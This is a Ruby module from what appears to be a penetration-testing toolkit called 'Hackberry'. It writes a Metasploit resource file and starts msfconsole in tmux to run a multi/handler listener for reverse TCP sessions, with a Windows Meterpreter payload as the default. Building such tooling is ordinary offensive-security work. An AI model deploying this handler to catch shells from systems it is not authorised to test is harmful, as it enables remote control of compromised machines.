# modules/payloads/msf_handler.rb
require_relative '../../core/module_base'
require_relative '../../core/exec'
require_relative '../../core/registry'

module Hackberry
  class MsfHandler < ModuleBase
    def self.id; 'pay_msf_handler'; end
    def self.category; :payloads; end
    def self.label; 'Metasploit Handler'; end
    def self.icon; '📦'; end

    def self.actions
      [
        {
          id:'tcp_rev', label:'Reverse TCP Handler', description:'multi/handler',
          inputs:[
            {name:'payload', label:'Payload', type:'text', default:'windows/x64/meterpreter/reverse_tcp'},
            {name:'lhost', label:'LHOST', type:'text', placeholder:'0.0.0.0'},
            {name:'lport', label:'LPORT', type:'number', default:'4444'}
          ]
        }
      ]
    end

    def self.run(action_id, p, cfg)
      pay = p['payload']
      lhost = p['lhost'] || '0.0.0.0'
      lport = (p['lport'] || '4444').to_i
      rc = File.join(cfg['paths']['captures'], "msfhandler-#{Hackberry::Exec.timestamp}.rc")
      File.write(rc, <<~RC)
        use exploit/multi/handler
        set PAYLOAD #{pay}
        set LHOST #{lhost}
        set LPORT #{lport}
        set ExitOnSession false
        exploit -j
      RC
      log = File.join(cfg['paths']['logs'], "msf-handler-#{Hackberry::Exec.timestamp}.log")
      cmd = "msfconsole -q -r #{rc}"
      Hackberry::Exec.tmux_run(name:'msf-handler', cmd: cmd, log_path: log)
    end
  end
end

Hackberry::Registry.register(Hackberry::MsfHandler)
